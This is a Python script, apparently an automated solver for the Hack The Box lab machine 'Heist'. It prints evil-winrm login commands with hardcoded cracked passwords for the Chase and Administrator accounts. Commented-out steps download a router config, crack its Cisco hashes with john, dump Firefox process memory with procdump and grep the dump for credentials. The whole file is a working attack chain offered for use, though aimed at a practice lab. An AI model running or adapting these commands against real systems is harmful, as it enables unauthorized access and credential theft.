import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
from ftplib import FTP

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Heist
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] Chase","[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.149" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"SMB {target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Heist Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------

def chase_user_connection():

    # -------------------- uncomment if the credentials do not work -------------------
    # commands_send("wget http://10.10.10.149/attachments/config.txt")
    # commands_send('cat config.txt | grep -e "enable secret" | awk \'{print $4}\' > hash')
    # commands_send("john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash")
    # commands_send("wget https://raw.githubusercontent.com/theevilbit/ciscot7/refs/heads/master/ciscot7.py")
    # p7passRouter=commands_send("cat config.txt | grep -e \"rout3r\" | awk '{print $5}'")
    # p7passAdmin=commands_send("cat config.txt | grep -e \"admin\" | awk '{print $7}'")
    # print(p7passRouter)
    # print(commands_send(f"python3 ciscot7.py --decrypt -p '{p7passRouter}'"))
    # print(commands_send(f"python3 ciscot7.py --decrypt -p '{p7passAdmin}'"))
    # commands_send("evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Paste_Your_Password_Chase'")
    # -------------------- uncomment if the credentials do not work -------------------


    print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'");cm.sleep(.5)

def administrator_user_connection():

    # -------------------- uncomment if the credentials do not work -------------------
    # commands_send("wget https://download.sysinternals.com/files/Procdump.zip")
    # commands_send("unzip Procdump.zip")
    # path=commands_send("pwd")
    # print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + f"upload {path}/procdump64.exe"  + Fore.LIGHTCYAN_EX + " [Windows Shell]");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + f"ps | findstr firefox"  + Fore.LIGHTCYAN_EX + " [Windows Shell]");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + f"\procdump64.exe -accepteula -ma 'You_Process_Firefox'" + Fore.LIGHTCYAN_EX + " [Windows Shell]");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + f"download C:\Users\Chase\Desktop\firefox.exe_250521_152026.dmp firefox.dmp"  + Fore.LIGHTCYAN_EX + " [Windows Shell]");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + "strings  firefox.dmp | grep '^RG_1=' | tr '=' ' ' | awk '{print $NF}'"  + Fore.LIGHTCYAN_EX + " [Windows Shell]");cm.sleep(.5)
    # print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Run command >" + Fore.LIGHTCYAN_EX + " evil-winrm -i 10.10.10.149 -u 'Administrator' -p 'Paste_Password_Admin'");cm.sleep(.5)
    # -------------------- uncomment if the credentials do not work -------------------
    
    
    print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Run command >" + Fore.LIGHTCYAN_EX + " evil-winrm -i 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'");cm.sleep(.5)

#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Chase-user connection"))
                print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Path Crendetials" + Fore.LIGHTCYAN_EX + f"http://{target_machine}/attachments/config.txt");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Cracked 7Password" + Fore.LIGHTCYAN_EX + f"https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html");cm.sleep(.5)
                chase_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Chase-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,Fore.RED + f"[Exploit - Administrator-user] > " + Fore.LIGHTCYAN_EX + f"Dump Firefox Process");cm.sleep(.5)
                print(tmsg,hmsg("user","Administrator user connection"))
                administrator_user_connection()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
